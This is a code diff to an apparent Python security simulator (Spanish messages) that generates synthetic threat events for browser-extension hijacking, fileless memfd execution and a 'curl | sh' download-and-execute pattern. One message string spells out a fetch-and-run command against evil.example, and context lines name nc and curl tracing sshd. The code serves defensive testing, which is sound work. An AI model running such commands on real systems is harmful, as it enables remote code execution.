@@ -78,6 +78,27 @@ class SimulatorCollector(Collector):
                     message=f"ptrace activo: '{random.choice(['python3','curl','nc'])}'"
                             f" rastrea 'sshd' (sim)",
                     tags={"hijack", "ptrace", "T1055.008"})
+            elif roll < 0.97:
+                # EdgeWatch sintético: hijack de navegador o fileless.
+                ev = random.choice([
+                    ThreatEvent(
+                        kind="edge_hijack_extension", severity=Severity.CRITICAL,
+                        message="extensión 'srch_helper' combina webRequest+"
+                                "cookies+<all_urls> (patrón de infostealer) (sim)",
+                        tags={"edge", "browser_hijack", "T1176"}),
+                    ThreatEvent(
+                        kind="edge_fileless", severity=Severity.CRITICAL,
+                        message=f"ejecución desde memfd_create "
+                                f"(/memfd:x (deleted), pid "
+                                f"{random.randint(2000, 30000)}) (sim)",
+                        tags={"edge", "fileless", "T1620"}),
+                    ThreatEvent(
+                        kind="edge_lolbin", severity=Severity.HIGH,
+                        message="descarga-y-ejecuta (curl|sh) en pid "
+                                f"{random.randint(2000, 30000)}: curl -fsSL "
+                                "http://evil.example/x.sh | sh (sim)",
+                        tags={"edge", "lolbin", "T1059"}),
+                ])
             else:
                 ev = ThreatEvent(
                     kind="login_success", src_ip=ip, user="admin",
